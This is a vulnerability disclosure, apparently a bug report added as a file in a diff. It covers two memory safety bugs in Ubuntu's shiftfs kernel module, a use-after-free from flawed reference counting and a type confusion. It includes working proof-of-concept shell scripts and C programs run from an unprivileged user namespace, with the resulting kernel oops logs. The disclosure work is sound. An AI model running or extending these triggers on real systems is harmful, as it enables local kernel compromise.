@@ -1,0 +1,311 @@
+Tested on Ubuntu 19.10, kernel "5.3.0-19-generic #20-Ubuntu".
+
+Ubuntu ships a filesystem "shiftfs" in fs/shiftfs.c in the kernel tree that
+doesn't exist upstream. This filesystem can be mounted from user namespaces,
+meaning that this is attack surface from unprivileged userspace in the default
+installation.
+
+There are two memory safety bugs around shiftfs_btrfs_ioctl_fd_replace().
+
+#################### Bug 1: Flawed reference counting ####################
+
+In shiftfs_btrfs_ioctl_fd_replace() ("//" comments added by me):
+
+
+	src = fdget(oldfd);
+	if (!src.file)
+		return -EINVAL;
+	// src holds one reference (assuming multithreaded execution)
+
+	ret = shiftfs_real_fdget(src.file, lfd);
+	// lfd->file is a file* now, but shiftfs_real_fdget didn't take any
+	// extra references
+	fdput(src);
+	// this drops the only reference we were holding on src, and src was
+	// the only thing holding a reference to lfd->file. lfd->file may be
+	// dangling at this point.
+	if (ret)
+		return ret;
+
+	*newfd = get_unused_fd_flags(lfd->file->f_flags);
+	if (*newfd < 0) {
+		// always a no-op
+		fdput(*lfd);
+		return *newfd;
+	}
+
+	fd_install(*newfd, lfd->file);
+	// fd_install() consumes a counted reference, but we don't hold any
+	// counted references. so at this point, if lfd->file hasn't been freed
+	// yet, its refcount is one lower than it ought to be.
+
+	[...]
+
+	// the following code is refcount-neutral, so the refcount stays one too
+	// low.
+	if (ret)
+		shiftfs_btrfs_ioctl_fd_restore(cmd, *lfd, *newfd, arg, v1, v2);
+
+
+shiftfs_real_fdget() is implemented as follows:
+
+static int shiftfs_real_fdget(const struct file *file, struct fd *lowerfd)
+{
+	struct shiftfs_file_info *file_info = file->private_data;
+	struct file *realfile = file_info->realfile;
+
+	lowerfd->flags = 0;
+	lowerfd->file = realfile;
+
+	/* Did the flags change since open? */
+	if (unlikely(file->f_flags & ~lowerfd->file->f_flags))
+		return shiftfs_change_flags(lowerfd->file, file->f_flags);
+
+	return 0;
+}
+
+Therefore, the following PoC will cause reference count overdecrements; I ran it
+with SLUB debugging enabled and got the following splat:
+
+=======================================
+user@ubuntu1910vm:~/shiftfs$ cat run.sh
+#!/bin/sh
+sync
+unshare -mUr ./run2.sh
+t run2user@ubuntu1910vm:~/shiftfs$ cat run2.sh
+#!/bin/sh
+set -e
+
+mkdir -p mnt/tmpfs
+mkdir -p mnt/shiftfs
+mount -t tmpfs none mnt/tmpfs
+mount -t shiftfs -o mark,passthrough=2 mnt/tmpfs mnt/shiftfs
+mount|grep shift
+touch mnt/tmpfs/foo
+gcc -o ioctl ioctl.c -Wall
+./ioctl
+user@ubuntu1910vm:~/shiftfs$ cat ioctl.c
+#include <sys/ioctl.h>
+#include <fcntl.h>
+#include <err.h>
+#include <unistd.h>
+#include <linux/btrfs.h>
+#include <sys/mman.h>
+
+int main(void) {
+  int root = open("mnt/shiftfs", O_RDONLY);
+  if (root == -1) err(1, "open shiftfs root");
+  int foofd = openat(root, "foo", O_RDONLY);
+  if (foofd == -1) err(1, "open foofd");
+  struct btrfs_ioctl_vol_args iocarg = {
+    .fd = foofd
+  };
+  ioctl(root, BTRFS_IOC_SNAP_CREATE, &iocarg);
+  sleep(1);
+  void *map = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, foofd, 0);
+  if (map != MAP_FAILED) munmap(map, 0x1000);
+}
+user@ubuntu1910vm:~/shiftfs$ ./run.sh
+none on /home/user/shiftfs/mnt/tmpfs type tmpfs (rw,relatime,uid=1000,gid=1000)
+/home/user/shiftfs/mnt/tmpfs on /home/user/shiftfs/mnt/shiftfs type shiftfs (rw,relatime,mark,passthrough=2)
+[  183.463452] general protection fault: 0000 [#1] SMP PTI
+[  183.467068] CPU: 1 PID: 2473 Comm: ioctl Not tainted 5.3.0-19-generic #20-Ubuntu
+[  183.472170] Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.12.0-1 04/01/2014
+[  183.476830] RIP: 0010:shiftfs_mmap+0x20/0xd0 [shiftfs]
+[  183.478524] Code: 20 cf 5d c3 c3 0f 1f 44 00 00 0f 1f 44 00 00 55 48 89 e5 41 57 41 56 41 55 41 54 48 8b 87 c8 00 00 00 4c 8b 68 10 49 8b 45 28 <48> 83 78 60 00 0f 84 97 00 00 00 49 89 fc 49 89 f6 48 39 be a0 00
+[  183.484585] RSP: 0018:ffffae48007c3d40 EFLAGS: 00010206
+[  183.486290] RAX: 6b6b6b6b6b6b6b6b RBX: ffff93f1fb7908a8 RCX: 7800000000000000
+[  183.489617] RDX: 8000000000000025 RSI: ffff93f1fb792208 RDI: ffff93f1f69fa400
+[  183.491975] RBP: ffffae48007c3d60 R08: ffff93f1fb792208 R09: 0000000000000000
+[  183.494311] R10: ffff93f1fb790888 R11: 00007f1d01d10000 R12: ffff93f1fb7908b0
+[  183.496675] R13: ffff93f1f69f9900 R14: ffff93f1fb792208 R15: ffff93f22f102e40
+[  183.499011] FS:  00007f1d01cd1540(0000) GS:ffff93f237a40000(0000) knlGS:0000000000000000
+[  183.501679] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  183.503568] CR2: 00007f1d01bc4c10 CR3: 0000000242726001 CR4: 0000000000360ee0
+[  183.505901] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+[  183.508229] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
+[  183.510580] Call Trace:
+[  183.511396]  mmap_region+0x417/0x670
+[  183.512592]  do_mmap+0x3a8/0x580
+[  183.513655]  vm_mmap_pgoff+0xcb/0x120
+[  183.514863]  ksys_mmap_pgoff+0x1ca/0x2a0
+[  183.516155]  __x64_sys_mmap+0x33/0x40
+[  183.517352]  do_syscall_64+0x5a/0x130
+[  183.518548]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
+[  183.520196] RIP: 0033:0x7f1d01bfaaf6
+[  183.521372] Code: 00 00 00 00 f3 0f 1e fa 41 f7 c1 ff 0f 00 00 75 2b 55 48 89 fd 53 89 cb 48 85 ff 74 37 41 89 da 48 89 ef b8 09 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 62 5b 5d c3 0f 1f 80 00 00 00 00 48 8b 05 61
+[  183.527210] RSP: 002b:00007ffdf50bae98 EFLAGS: 00000246 ORIG_RAX: 0000000000000009
+[  183.529582] RAX: ffffffffffffffda RBX: 0000000000000001 RCX: 00007f1d01bfaaf6
+[  183.531811] RDX: 0000000000000001 RSI: 0000000000001000 RDI: 0000000000000000
+[  183.533999] RBP: 0000000000000000 R08: 0000000000000004 R09: 0000000000000000
+[  183.536199] R10: 0000000000000001 R11: 0000000000000246 R12: 00005616cf6f5140
+[  183.538448] R13: 00007ffdf50bbfb0 R14: 0000000000000000 R15: 0000000000000000
+[  183.540714] Modules linked in: shiftfs intel_rapl_msr intel_rapl_common kvm_intel kvm irqbypass snd_hda_codec_generic ledtrig_audio snd_hda_intel snd_hda_codec snd_hda_core crct10dif_pclmul snd_hwdep crc32_pclmul ghash_clmulni_intel snd_pcm aesni_intel snd_seq_midi snd_seq_midi_event aes_x86_64 crypto_simd snd_rawmidi cryptd joydev input_leds snd_seq glue_helper qxl snd_seq_device snd_timer ttm drm_kms_helper drm snd fb_sys_fops syscopyarea sysfillrect sysimgblt serio_raw qemu_fw_cfg soundcore mac_hid sch_fq_codel parport_pc ppdev lp parport virtio_rng ip_tables x_tables autofs4 hid_generic usbhid hid virtio_net net_failover psmouse ahci i2c_i801 libahci lpc_ich virtio_blk failover
+[  183.560350] ---[ end trace 4a860910803657c2 ]---
+[  183.561832] RIP: 0010:shiftfs_mmap+0x20/0xd0 [shiftfs]
+[  183.563496] Code: 20 cf 5d c3 c3 0f 1f 44 00 00 0f 1f 44 00 00 55 48 89 e5 41 57 41 56 41 55 41 54 48 8b 87 c8 00 00 00 4c 8b 68 10 49 8b 45 28 <48> 83 78 60 00 0f 84 97 00 00 00 49 89 fc 49 89 f6 48 39 be a0 00
+[  183.569438] RSP: 0018:ffffae48007c3d40 EFLAGS: 00010206
+[  183.571102] RAX: 6b6b6b6b6b6b6b6b RBX: ffff93f1fb7908a8 RCX: 7800000000000000
+[  183.573362] RDX: 8000000000000025 RSI: ffff93f1fb792208 RDI: ffff93f1f69fa400
+[  183.575655] RBP: ffffae48007c3d60 R08: ffff93f1fb792208 R09: 0000000000000000
+[  183.577893] R10: ffff93f1fb790888 R11: 00007f1d01d10000 R12: ffff93f1fb7908b0
+[  183.580166] R13: ffff93f1f69f9900 R14: ffff93f1fb792208 R15: ffff93f22f102e40
+[  183.582411] FS:  00007f1d01cd1540(0000) GS:ffff93f237a40000(0000) knlGS:0000000000000000
+[  183.584960] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  183.586796] CR2: 00007f1d01bc4c10 CR3: 0000000242726001 CR4: 0000000000360ee0
+[  183.589035] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+[  183.591279] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
+=======================================
+
+Disassembly of surrounding code:
+
+55                push rbp
+4889E5            mov rbp,rsp
+4157              push r15
+4156              push r14
+4155              push r13
+4154              push r12
+488B87C8000000    mov rax,[rdi+0xc8]
+4C8B6810          mov r13,[rax+0x10]
+498B4528          mov rax,[r13+0x28]
+4883786000        cmp qword [rax+0x60],byte +0x0 <-- GPF HERE
+0F8497000000      jz near 0xcc
+4989FC            mov r12,rdi
+4989F6            mov r14,rsi
+
+This is an attempted dereference of 0x6b6b6b6b6b6b6b6b, which is POISON_FREE; I
+think this corresponds to the load of "realfile->f_op->mmap" in the source code.
+
+
+
+#################### Bug 2: Type confusion ####################
+
+shiftfs_btrfs_ioctl_fd_replace() calls fdget(oldfd), then without further checks
+passes the resulting file* into shiftfs_real_fdget(), which does this:
+
+static int shiftfs_real_fdget(const struct file *file, struct fd *lowerfd)
+{
+	struct shiftfs_file_info *file_info = file->private_data;
+	struct file *realfile = file_info->realfile;
+
+	lowerfd->flags = 0;
+	lowerfd->file = realfile;
+
+	/* Did the flags change since open? */
+	if (unlikely(file->f_flags & ~lowerfd->file->f_flags))
+		return shiftfs_change_flags(lowerfd->file, file->f_flags);
+
+	return 0;
+}
+
+file->private_data is a void* that points to a filesystem-dependent type; and
+some filesystems even use it to store a type-cast number instead of a pointer.
+The implicit cast to a "struct shiftfs_file_info *" can therefore be a bad cast.
+
+As a PoC, here I'm causing a type confusion between struct shiftfs_file_info
+(with ->realfile at offset 0x10) and struct mm_struct (with vmacache_seqnum at
+offset 0x10), and I use that to cause a memory dereference somewhere around
+0x4242:
+
+
+=======================================
+user@ubuntu1910vm:~/shiftfs_confuse$ cat run.sh
+#!/bin/sh
+sync
+unshare -mUr ./run2.sh
+user@ubuntu1910vm:~/shiftfs_confuse$ cat run2.sh
+#!/bin/sh
+set -e
+
+mkdir -p mnt/tmpfs
+mkdir -p mnt/shiftfs
+mount -t tmpfs none mnt/tmpfs
+mount -t shiftfs -o mark,passthrough=2 mnt/tmpfs mnt/shiftfs
+mount|grep shift
+gcc -o ioctl ioctl.c -Wall
+./ioctl
+user@ubuntu1910vm:~/shiftfs_confuse$ cat ioctl.c
+#include <sys/ioctl.h>
+#include <fcntl.h>
+#include <err.h>
+#include <unistd.h>
+#include <linux/btrfs.h>
+#include <sys/mman.h>
+
+int main(void) {
+  // make our vmacache sequence number something like 0x4242
+  for (int i=0; i<0x4242; i++) {
+    void *x = mmap((void*)0x100000000UL, 0x1000, PROT_READ,
+        MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
+    if (x == MAP_FAILED) err(1, "mmap vmacache seqnum");
+    munmap(x, 0x1000);
+  }
+
+  int root = open("mnt/shiftfs", O_RDONLY);
+  if (root == -1) err(1, "open shiftfs root");
+  int foofd = open("/proc/self/environ", O_RDONLY);
+  if (foofd == -1) err(1, "open foofd");
+  // trigger the confusion
+  struct btrfs_ioctl_vol_args iocarg = {
+    .fd = foofd
+  };
+  ioctl(root, BTRFS_IOC_SNAP_CREATE, &iocarg);
+}
+user@ubuntu1910vm:~/shiftfs_confuse$ ./run.sh
+none on /home/user/shiftfs_confuse/mnt/tmpfs type tmpfs (rw,relatime,uid=1000,gid=1000)
+/home/user/shiftfs_confuse/mnt/tmpfs on /home/user/shiftfs_confuse/mnt/shiftfs type shiftfs (rw,relatime,mark,passthrough=2)
+[  348.103005] BUG: unable to handle page fault for address: 0000000000004289
+[  348.105060] #PF: supervisor read access in kernel mode
+[  348.106573] #PF: error_code(0x0000) - not-present page
+[  348.108102] PGD 0 P4D 0 
+[  348.108871] Oops: 0000 [#1] SMP PTI
+[  348.109912] CPU: 6 PID: 2192 Comm: ioctl Not tainted 5.3.0-19-generic #20-Ubuntu
+[  348.112109] Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.12.0-1 04/01/2014
+[  348.114460] RIP: 0010:shiftfs_real_ioctl+0x22e/0x410 [shiftfs]
+[  348.116166] Code: 38 44 89 ff e8 43 91 01 d3 49 89 c0 49 83 e0 fc 0f 84 ce 01 00 00 49 8b 90 c8 00 00 00 41 8b 70 40 48 8b 4a 10 89 c2 83 e2 01 <8b> 79 40 48 89 4d b8 89 f8 f7 d0 85 f0 0f 85 e8 00 00 00 85 d2 75
+[  348.121578] RSP: 0018:ffffb1e7806ebdc8 EFLAGS: 00010246
+[  348.123097] RAX: ffff9ce6302ebcc0 RBX: ffff9ce6302e90c0 RCX: 0000000000004249
+[  348.125174] RDX: 0000000000000000 RSI: 0000000000008000 RDI: 0000000000000004
+[  348.127222] RBP: ffffb1e7806ebe30 R08: ffff9ce6302ebcc0 R09: 0000000000001150
+[  348.129288] R10: ffff9ce63680e840 R11: 0000000080010d00 R12: 0000000050009401
+[  348.131358] R13: 00007ffd87558310 R14: ffff9ce60cffca88 R15: 0000000000000004
+[  348.133421] FS:  00007f77fa842540(0000) GS:ffff9ce637b80000(0000) knlGS:0000000000000000
+[  348.135753] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  348.137413] CR2: 0000000000004289 CR3: 000000026ff94001 CR4: 0000000000360ee0
+[  348.139451] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+[  348.141516] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
+[  348.143545] Call Trace:
+[  348.144272]  shiftfs_ioctl+0x65/0x76 [shiftfs]
+[  348.145562]  do_vfs_ioctl+0x407/0x670
+[  348.146620]  ? putname+0x4a/0x50
+[  348.147556]  ksys_ioctl+0x67/0x90
+[  348.148514]  __x64_sys_ioctl+0x1a/0x20
+[  348.149593]  do_syscall_64+0x5a/0x130
+[  348.150658]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
+[  348.152108] RIP: 0033:0x7f77fa76767b
+[  348.153140] Code: 0f 1e fa 48 8b 05 15 28 0d 00 64 c7 00 26 00 00 00 48 c7 c0 ff ff ff ff c3 66 0f 1f 44 00 00 f3 0f 1e fa b8 10 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d e5 27 0d 00 f7 d8 64 89 01 48
+[  348.158466] RSP: 002b:00007ffd875582e8 EFLAGS: 00000217 ORIG_RAX: 0000000000000010
+[  348.160610] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f77fa76767b
+[  348.162644] RDX: 00007ffd87558310 RSI: 0000000050009401 RDI: 0000000000000003
+[  348.164680] RBP: 00007ffd87559320 R08: 00000000ffffffff R09: 0000000000000000
+[  348.167456] R10: 0000000000000000 R11: 0000000000000217 R12: 0000561c135ee100
+[  348.169530] R13: 00007ffd87559400 R14: 0000000000000000 R15: 0000000000000000
+[  348.171573] Modules linked in: shiftfs intel_rapl_msr intel_rapl_common kvm_intel kvm snd_hda_codec_generic irqbypass ledtrig_audio crct10dif_pclmul crc32_pclmul snd_hda_intel snd_hda_codec ghash_clmulni_intel snd_hda_core snd_hwdep aesni_intel aes_x86_64 snd_pcm crypto_simd cryptd glue_helper snd_seq_midi joydev snd_seq_midi_event snd_rawmidi snd_seq input_leds snd_seq_device snd_timer serio_raw qxl snd ttm drm_kms_helper mac_hid soundcore drm fb_sys_fops syscopyarea sysfillrect qemu_fw_cfg sysimgblt sch_fq_codel parport_pc ppdev lp parport virtio_rng ip_tables x_tables autofs4 hid_generic usbhid hid psmouse i2c_i801 ahci virtio_net lpc_ich libahci net_failover failover virtio_blk
+[  348.188617] CR2: 0000000000004289
+[  348.189586] ---[ end trace dad859a1db86d660 ]---
+[  348.190916] RIP: 0010:shiftfs_real_ioctl+0x22e/0x410 [shiftfs]
+[  348.193401] Code: 38 44 89 ff e8 43 91 01 d3 49 89 c0 49 83 e0 fc 0f 84 ce 01 00 00 49 8b 90 c8 00 00 00 41 8b 70 40 48 8b 4a 10 89 c2 83 e2 01 <8b> 79 40 48 89 4d b8 89 f8 f7 d0 85 f0 0f 85 e8 00 00 00 85 d2 75
+[  348.198713] RSP: 0018:ffffb1e7806ebdc8 EFLAGS: 00010246
+[  348.200226] RAX: ffff9ce6302ebcc0 RBX: ffff9ce6302e90c0 RCX: 0000000000004249
+[  348.202257] RDX: 0000000000000000 RSI: 0000000000008000 RDI: 0000000000000004
+[  348.204294] RBP: ffffb1e7806ebe30 R08: ffff9ce6302ebcc0 R09: 0000000000001150
+[  348.206324] R10: ffff9ce63680e840 R11: 0000000080010d00 R12: 0000000050009401
+[  348.208362] R13: 00007ffd87558310 R14: ffff9ce60cffca88 R15: 0000000000000004
+[  348.210395] FS:  00007f77fa842540(0000) GS:ffff9ce637b80000(0000) knlGS:0000000000000000
+[  348.212710] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  348.214365] CR2: 0000000000004289 CR3: 000000026ff94001 CR4: 0000000000360ee0
+[  348.216409] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+[  348.218349] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
+Killed
+user@ubuntu1910vm:~/shiftfs_confuse$ 
+=======================================
